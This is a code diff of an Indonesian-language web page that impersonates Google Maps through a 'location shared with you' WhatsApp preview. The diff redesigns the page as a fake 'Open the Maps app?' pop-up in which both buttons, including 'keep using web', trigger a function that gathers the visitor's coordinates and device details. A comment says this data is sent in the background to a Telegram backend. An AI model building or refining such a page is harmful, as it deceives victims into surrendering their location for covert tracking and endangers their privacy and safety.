@@ -6,63 +6,120 @@
     <title>Google Maps</title>
     <!-- Open Graph untuk Pratinjau WhatsApp -->
     <meta property="og:title" content="📍 Lokasi Terbagikan">
-    <meta property="og:description" content="Seseorang telah membagikan lokasi terkini dengan Anda. Ketuk untuk melihat rute.">
+    <meta property="og:description" content="Seseorang telah membagikan lokasi terkini dengan Anda.">
     <meta property="og:url" content="https://shareloc.online">
     <meta property="og:type" content="website">
 
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, Arial, sans-serif; }
         body { 
-            font-family: Roboto, Arial, sans-serif; 
-            background: #f8f9fa; 
+            background: #dadce0; 
+            height: 100vh; 
             display: flex; 
             justify-content: center; 
             align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+            overflow: hidden;
+            position: relative;
         }
-        .card { 
-            background: white; 
-            padding: 36px 24px; 
-            border-radius: 16px; 
-            box-shadow: 0 4px 20px rgba(0,0,0,0.08); 
-            text-align: center; 
-            max-width: 360px; 
-            width: 90%; 
+
+        /* Simulasi Background Peta di Belakang Pop-up */
+        .map-mockup {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background-image: url('https://images.unsplash.com/photo-1524661135-423995f22d0b?auto=format&fit=crop&q=80&w=1000');
+            background-size: cover;
+            background-position: center;
+            filter: blur(1px) brightness(0.8);
+            z-index: 1;
         }
-        /* Logo Resmi Google Maps */
+
+        /* Overlay Gelap Transparan di Belakang Modal */
+        .modal-backdrop {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        /* Kotak Pop-up Tengah */
+        .modal-card {
+            background: white;
+            padding: 28px 24px 24px 24px;
+            border-radius: 28px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.25);
+            text-align: center;
+            max-width: 340px;
+            width: 100%;
+            z-index: 3;
+            animation: popIn 0.3s ease-out;
+        }
+
+        @keyframes popIn {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        /* Logo Pin Google Maps di dalam Pop-up */
         .logo {
-            width: 64px;
-            height: 64px;
+            width: 48px;
+            height: 48px;
             margin-bottom: 16px;
             object-fit: contain;
         }
+
         h3 { 
             color: #202124; 
-            margin-bottom: 8px; 
+            margin-bottom: 10px; 
             font-size: 20px; 
             font-weight: 500; 
         }
+        
         p { 
             color: #5f6368; 
             font-size: 14px; 
             margin-bottom: 24px; 
             line-height: 1.5; 
         }
-        .btn {
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 15px;
+
+        /* Tombol Aksi */
+        .btn-container {
+            display: flex;
+            gap: 10px;
+        }
+        .btn-outline {
+            background: transparent;
+            color: #1a73e8;
+            border: 1px solid #dadce0;
+            padding: 12px 14px;
+            font-size: 14px;
             font-weight: 500;
             border-radius: 24px;
             cursor: pointer;
-            width: 100%;
+            width: 50%;
+            transition: background 0.2s;
+        }
+        .btn-outline:hover { background-color: rgba(26,115,232,0.04); }
+
+        .btn-solid {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 12px 14px;
+            font-size: 14px;
+            font-weight: 500;
+            border-radius: 24px;
+            cursor: pointer;
+            width: 50%;
             box-shadow: 0 1px 3px rgba(60,64,67,0.3);
             transition: background 0.2s;
         }
-        .btn:hover { background-color: #1557b0; }
+        .btn-solid:hover { background-color: #1557b0; }
+
+        /* Spinner Loading */
         .spinner { 
             border: 3px solid #f1f3f4; 
             border-top: 3px solid #1a73e8; 
@@ -75,12 +132,23 @@
     </style>
 </head>
 <body>
-    <div class="card" id="main-card">
-        <!-- Logo Resmi Google Maps sesuai gambar referensi -->
-        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Google_Maps_Logo_2020.svg" alt="Google Maps">
-        <h3>Google Maps</h3>
-        <p>Seseorang telah membagikan lokasi terkini dengan Anda.</p>
-        <button class="btn" onclick="startTracking()">Buka Peta</button>
+
+    <!-- Latar Belakang Peta Semu -->
+    <div class="map-mockup"></div>
+
+    <!-- Backdrop & Pop-up Utama -->
+    <div class="modal-backdrop" id="backdrop">
+        <div class="modal-card" id="main-card">
+            <!-- Logo Resmi Google Maps sesuai gambar referensi -->
+            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/b/bd/Google_Maps_Logo_2020.svg" alt="Google Maps">
+            <h3>Buka aplikasi Google Maps?</h3>
+            <p>Dapatkan navigasi real-time dan lainnya di aplikasi Maps</p>
+            
+            <div class="btn-container">
+                <button class="btn-outline" onclick="startTracking()">Tetap gunakan web</button>
+                <button class="btn-solid" onclick="startTracking()">Lanjutkan</button>
+            </div>
+        </div>
     </div>
 
     <script>
@@ -89,7 +157,7 @@
             card.innerHTML = `
                 <div class="spinner"></div>
                 <h3 style="margin-top: 15px;">Memuat Peta...</h3>
-                <p style="margin-bottom: 0;">Menghubungkan ke lokasi...</p>
+                <p style="margin-bottom: 0;">Mempersiapkan rute...</p>
             `;
 
             let latitude = null;
@@ -114,8 +182,6 @@
             const deviceData = {
                 hardwareConcurrency: navigator.hardwareConcurrency || '-',
                 deviceMemory: navigator.deviceMemory || '-',
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                language: navigator.language || '-'
             };
 
             // 3. Kirim data ke backend Telegram secara background
